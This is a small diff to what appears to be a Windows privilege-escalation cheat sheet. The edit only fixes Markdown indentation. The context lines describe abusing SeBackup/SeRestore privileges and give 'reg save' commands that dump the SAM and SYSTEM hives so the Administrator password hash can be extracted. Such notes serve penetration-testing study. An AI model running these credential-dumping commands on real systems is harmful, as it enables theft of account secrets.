@@ -89,7 +89,7 @@ find all the windows tokens with their meanings [Here](https://learn.microsoft.c
 
 ## SeBackup / SeRestore:
 The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. attacker can copy the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
-	- backup SAM and SYSTEM hashes:
+- backup SAM and SYSTEM hashes:
 	```ps1
 	reg save hklm\system C:\anywhere\system.hive
 	reg save hklm\sam C:\anywhere\sam.hive
